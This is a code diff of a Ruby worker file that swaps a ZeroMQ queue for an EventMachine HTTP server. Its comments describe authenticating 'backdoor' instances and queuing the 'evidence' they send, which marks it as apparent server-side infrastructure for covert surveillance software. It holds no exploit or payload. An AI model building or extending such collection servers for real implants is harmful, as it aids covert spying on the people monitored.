@@ -2,25 +2,103 @@
 # The main file of the worker
 #
 
+# relatives
+require_relative 'audio_processor'
+require_relative 'config'
+require_relative 'evidence/call'
+require_relative 'parser'
+
 # from RCS::Common
 require 'rcs-common/trace'
 require 'rcs-common/evidence'
 require 'rcs-common/evidence_manager'
 
-# from RCS::Audio
-require 'rcs-worker/audio_processor'
-require 'rcs-worker/config'
-require 'rcs-worker/evidence/call'
-
 # form System
 require 'digest/md5'
-require 'em-zeromq'
 require 'optparse'
+
+require 'eventmachine'
+require 'evma_httpserver'
 
 module RCS
 module Worker
 
-class DummyWorker
+Thread.abort_on_exception=true
+
+class HTTPHandler < EM::Connection
+  include RCS::Tracer
+  include EM::HttpServer
+  include Parser
+
+  def post_init
+    # don't forget to call super here !
+    super
+    
+    # to speed-up the processing, we disable the CGI environment variables
+    self.no_environment_strings
+    
+    # set the max content length of the POST
+    self.max_content_length = 30 * 1024 * 1024
+    
+    # get the peer name
+    @peer_port, @peer = Socket.unpack_sockaddr_in(get_peername)
+    trace :debug, "Connection from #{@peer}:#{@peer_port}"
+  end
+
+def process_http_request
+    # the http request details are available via the following instance variables:
+    #   @http_protocol
+    #   @http_request_method
+    #   @http_cookie
+    #   @http_if_none_match
+    #   @http_content_type
+    #   @http_path_info
+    #   @http_request_uri
+    #   @http_query_string
+    #   @http_post_content
+    #   @http_headers
+
+    trace :debug, "[#{@peer}] Incoming HTTP Connection"
+    trace :debug, "[#{@peer}] Request: [#{@http_request_method}] #{@http_request_uri}"
+
+    resp = EM::DelegatedHttpResponse.new(self)
+
+    # Block which fulfills the request
+    operation = proc do
+
+      # do the dirty job :)
+      # here we pass the control to the internal parser which will return:
+      #   - the content of the reply
+      #   - the content_type
+      #   - the cookie if the backdoor successfully passed the auth phase
+      begin
+        status, content, content_type = http_parse(@http_headers.split("\x00"), @http_request_method, @http_request_uri, @http_cookie, @http_post_content)
+      rescue Exception => e
+        trace :error, "ERROR: " + e.message
+        trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
+      end
+      
+      # prepare the HTTP response
+      resp.status = status
+      #TODO: status_string from status
+      resp.status_string = "OK"
+      resp.content = content
+      resp.headers['Content-Type'] = content_type
+      resp.headers['Connection'] = 'close'
+    end
+    
+    # Callback block to execute once the request is fulfilled
+    callback = proc do |res|
+    	resp.send_response
+    end
+
+    # Let the thread pool handle request
+    EM.defer(operation, callback)
+  end
+
+end
+=begin
+class EvidenceWorker
   include Tracer
   
   SLEEP_TIME = 10
@@ -31,118 +109,104 @@ class DummyWorker
     @evidences = []
     trace :info, "Issuing worker for backdoor instance #{instance}."
   end
-
+  
   def stopped?
     @state == :stopped
   end
-  
+
+  def sleeping_too_much?
+    
+  end
+    
   def queue(evidence)
     
+    # queue the evidence
+    #trace :info, "queueing #{evidence} for #{@instance}"
+    @evidences << evidence
+
+    # prepare the Proc used for handling the deferred work
     process = Proc.new do
       @state = :running
       seconds_sleeping = 0
       trace :debug, "[#{Thread.current}][#{@instance}] starting processing."
-      
+
       while seconds_sleeping < SLEEP_TIME
         until @evidences.empty?
+          trace :debug, "[#{Thread.current}][#{@instance}] evidences #{@evidences}"
           ev = @evidences.shift
           trace :debug, "[#{Thread.current}][#{@instance}] processing #{ev}."
           sleep 1
           seconds_sleeping = 0
         end
-        
+
         sleep 1
         seconds_sleeping += 1
+        trace :debug, "[#{Thread.current}] sleeping #{seconds_sleeping}"
       end
       
       trace :debug, "[#{Thread.current}][#{@instance}] sleeping too much, stopping!"
       @state = :stopped
     end
     
-    trace :info, "queueing #{evidence} for #{@instance}"
-    @evidences << evidence
-    
+    # if the thread was sleeping, restart it
     if stopped?
       trace :debug, "deferring work for #{@instance}"
       EM.defer process
     end
-    
   end
 end
 
-class EMTestPullHandler
+class EMPullHandler
   include Tracer
   
   attr_reader :received
   
   def initialize
+    @workers = []
     @queue = {}
   end
   
   def on_readable(socket, messages)
     # each message is "<backdoor_instance>:<evidence_id>"
+    trace :debug, "on_readable"
     messages.each do |m|
       msg = m.copy_out_string
+      trace :debug, "received: #{msg}"
       instance, evidence = msg.split(":")
-      @queue[instance] ||= DummyWorker.new instance
+
+      unless @queue.has_key? instance
+        worker = EvidenceWorker.new instance
+        @workers << worker
+        @queue[instance] = worker
+      end
+      
       @queue[instance].queue evidence
     end
   end
-  
-=begin
-  def initialize
-    @queue = []
-
-    @process = Proc.new do
-      result = []
-      until @queue.empty?
-        msg = @queue.shift
-        puts "#{Thread.current} #{msg}\n"
-        result << msg
-      end
-      result
-    end
-    
-    @callback = Proc.new do |status|
-      puts "processed #{status}\n"
-    end
-  end
-  
-  def on_readable(socket, messages)
-    messages.each do |m|
-      msg = m.copy_out_string
-      puts "Got message #{msg}\n"
-      @queue << msg
-    end
-    EM.defer @process, @callback
-  end
-  
-=end
 end
+=end
 
 class Worker
   include Tracer
-
+  
   attr_reader :type, :audio_processor
-
+  
   def setup(port = 5150)
-
+    
     # main EventMachine loop
     begin
-
+      
       # all the events are handled here
       EM::run do
         # if we have epoll(), prefer it over select()
         EM.epoll
         
         # set the thread pool size
-        EM.threadpool_size = 500
+        EM.threadpool_size = 50
         
-        ctx = EM::ZeroMQ::Context.new 1
-        
-        # setup one pull 0mq socket
-        ctx.connect ZMQ::PULL, "tcp://127.0.0.1:#{port}", EMTestPullHandler.new
+        EM::start_server("127.0.0.1", port, HTTPHandler)
         trace :info, "Listening on port #{port}..."
+        
       end
     rescue Exception => e
       # bind error
